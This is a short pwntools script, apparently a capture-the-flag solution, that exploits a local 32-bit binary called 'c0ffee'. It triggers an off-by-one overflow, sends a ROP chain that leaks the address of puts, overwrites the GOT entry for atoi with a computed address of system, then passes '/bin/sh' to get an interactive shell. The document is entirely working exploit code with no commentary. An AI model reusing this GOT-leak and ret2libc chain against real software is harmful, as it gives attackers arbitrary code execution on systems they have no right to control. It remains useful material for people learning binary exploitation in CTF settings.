from pwn import *

p = process('./c0ffee')
elf = ELF('./c0ffee')

# gdb.attach(p, '''b *0x08048d53
# b*0x8048bcd
# handle SIGALRM ignore
# c
# ''')
# context.log_level = 'debug'
# context.terminal = ["tmux", "splitw", "-v"]

def coffee(s, n, ans):
    p.recvuntil(b'size> ')
    p.sendline(s)
    p.sendline(n)
    p.recvuntil(b'sir?\n>> ')
    p.sendline(b'a'*8) # off by one count
    p.recvuntil(b'sir?\n> ')
    p.sendline(ans)
    return

pop_1 = p32(0x08048885)
pop_3 = p32(0x08048d50)
main = p32(0x08048920)

p.sendline(b'ffffffff')
for i in range(10):
    coffee(b'1', b'a', b'yes')
pl = b'a'*20 + p32(elf.plt['puts']) + pop_1 + p32(elf.got['puts'])
pl += p32(elf.plt['read']) + pop_3 + p32(0) + p32(elf.got['atoi']) + p32(4)
pl += main
coffee(str(len(pl)).encode(), pl, b'no')
leak_puts = u32(p.recv()[0x6d:0x71])
system = leak_puts - 0x2bca0
log.info("system: " + hex(system))
p.sendline(p32(system))
p.sendline(b'/bin/sh')
p.interactive()
